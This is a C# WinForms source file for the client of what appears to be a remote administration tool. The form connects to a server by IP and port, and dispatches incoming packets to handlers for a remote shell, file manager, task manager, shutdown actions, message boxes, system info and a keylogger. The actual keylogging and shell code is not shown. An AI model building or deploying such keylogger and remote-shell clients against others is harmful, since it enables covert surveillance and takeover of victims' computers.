using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using Client.Handlers;
using Client.Networking;
using Client.Services;
using Common.Networking;
using Common.Utils;

namespace Client
{
    public partial class MainClientForm: Form
    {
        private ClientConnection? _connection;
        private PacketHandler? _packetHandler;
        private SystemInfoHandler? _systemInfoHandler;
        private RemoteShellHandler? _remoteShellHandler;
        private FileManagerHandler? _fileManagerHandler;
        private TaskManagerHandler? _taskManagerHandler;
        private MessageBoxHandler? _messageBoxHandler;
        private ShutdownActionHandler? _shutdownActionHandler;
        private KeyLoggerHandler? _keyLoggerHandler;

		public MainClientForm()
        {
            InitializeComponent();
        }

        protected override void OnLoad(EventArgs e)
        {
            base.OnLoad(e);
            _connection = new ClientConnection();
            var sysService = new SystemInfoService();
            var remoteShellService = new RemoteShellService();
            var fileManagerService = new FileManagerService();
            var messageBoxService = new MessageBoxService();
            var taskManagerService = new TaskManagerService();
            var shutdownActionService = new ShutdownActionService();
            var keyLoggerService = new KeyLoggerService(_connection);
            _systemInfoHandler = new SystemInfoHandler(sysService, _connection);
            _remoteShellHandler = new RemoteShellHandler(remoteShellService, _connection);
            _fileManagerHandler = new FileManagerHandler(fileManagerService, _connection);
            _messageBoxHandler = new MessageBoxHandler(messageBoxService, _connection);
            _taskManagerHandler = new TaskManagerHandler(taskManagerService, _connection);
            _shutdownActionHandler = new ShutdownActionHandler(shutdownActionService, _connection);
            _keyLoggerHandler = new KeyLoggerHandler(keyLoggerService);
            _packetHandler = new PacketHandler(
               onSystemInfoRequest: req => _ = _systemInfoHandler!.HandleAsync(req),
               onRemoteShellRequest: sreq => _ = _remoteShellHandler!.HandleAsync(sreq),
               onFileManagerRequest: freq => _ = _fileManagerHandler!.HandleAsync(freq),
               onMessageBoxRequest: mreq => _ = _messageBoxHandler!.HandleAsync(mreq),
               onShutdownActionRequest: sdreq => _shutdownActionHandler!.HandleAsync(sdreq),
               onKeyLoggerStart: kls => _ = _keyLoggerHandler!.HandleStartAsync(kls),
               onKeyLoggerStop: klt => _ = _keyLoggerHandler!.HandleStopAsync(klt),
               onKeyLoggerLangToggle: l => _ = _keyLoggerHandler!.HandleLangToggleAsync(l),
               onTaskManagerRequest: treq => _ = _taskManagerHandler!.HandleAsync(treq)
           );
            _connection.OnLineReceived += line => _packetHandler.HandleLine(line);
            _connection.OnDisconnected += () =>
            {
                if (InvokeRequired)
                {
                    BeginInvoke(new Action(UpdateUiDisconnected));
                }
                else
                {
                    UpdateUiDisconnected();
                }
            };
        }

        private async void btnConnect_Click(object sender, EventArgs e)
        {
            if (_connection == null) return;
            try
            {
                if (!_connection.IsConnected)
                {
                    AppendLog($"[{DateTime.Now:HH:mm:ss}] Connecting to {txtServerIp.Text}:{txtPort.Text}");
                    await _connection.ConnectAsync(txtServerIp.Text, int.Parse(txtPort.Text));
                    lblStatus.ForeColor = Color.Green;
                    lblStatus.Text = $"Connected to {txtServerIp.Text}:{txtPort.Text}";
                    btnConnect.Text = "Disconnect";
                    AppendLog($"[{DateTime.Now:HH:mm:ss}] Connected");
                }
                else
                {
                    _connection.Dispose();
                    lblStatus.ForeColor = Color.Red;
                    lblStatus.Text = "Disconnected";
                    btnConnect.Text = "Connect";
                    AppendLog($"[{DateTime.Now:HH:mm:ss}] Disconnected");
                }
            }
            catch (Exception ex)
            {
                AppendLog($"[{DateTime.Now:HH:mm:ss}] [ERROR] {ex.Message}");
            }
        }

        private void AppendLog(string line)
        {
            if (txtLog.InvokeRequired)
            {
                txtLog.BeginInvoke(new Action(() => AppendLog(line)));
                return;
            }
            txtLog.AppendText(line + Environment.NewLine);
        }

        private void UpdateUiDisconnected()
        {
            lblStatus.ForeColor = Color.Red;
            lblStatus.Text = "Disconnected";
            btnConnect.Text = "Connect"; 
            AppendLog($"[{DateTime.Now:HH:mm:ss}] Disconnected by server");
        }
    }
}
